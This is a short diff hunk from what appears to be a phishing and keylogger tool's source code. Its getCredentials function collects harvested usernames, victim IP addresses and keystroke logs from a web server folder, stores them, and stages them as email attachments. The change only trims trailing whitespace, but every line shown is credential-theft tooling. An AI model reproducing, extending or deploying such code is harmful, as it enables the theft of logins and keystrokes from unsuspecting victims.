@@ -1497,18 +1497,18 @@ def getCredentials(port):
     system("fuser -k Server/www/usernames.txt > /dev/null 2>&1")
     system("fuser -k Server/www/ip.txt > /dev/null 2>&1")
     system(
-        """cat Server/www/usernames.txt > Server/CapturedData/usernames.txt && 
+        """cat Server/www/usernames.txt > Server/CapturedData/usernames.txt &&
             cp Server/CapturedData/usernames.txt Defs/Send_Email/attachments/usernames.txt &&
             rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt"""
     )
     system(
-        """cat Server/www/ip.txt > Server/CapturedData/ip.txt && 
-            cp Server/CapturedData/ip.txt Defs/Send_Email/attachments/ip.txt && 
+        """cat Server/www/ip.txt > Server/CapturedData/ip.txt &&
+            cp Server/CapturedData/ip.txt Defs/Send_Email/attachments/ip.txt &&
             rm -rf Server/www/ip.txt && touch Server/www/ip.txt"""
     )
     system(
-        """touch Server/CapturedData/KeyloggerData.txt && 
-            cat Server/www/KeyloggerData.txt >> Server/CapturedData/KeyloggerData.txt && 
+        """touch Server/CapturedData/KeyloggerData.txt &&
+            cat Server/www/KeyloggerData.txt >> Server/CapturedData/KeyloggerData.txt &&
              cp Server/CapturedData/KeyloggerData.txt Defs/Send_Email/attachments/KeyloggerData.txt &&
              rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt"""
     )
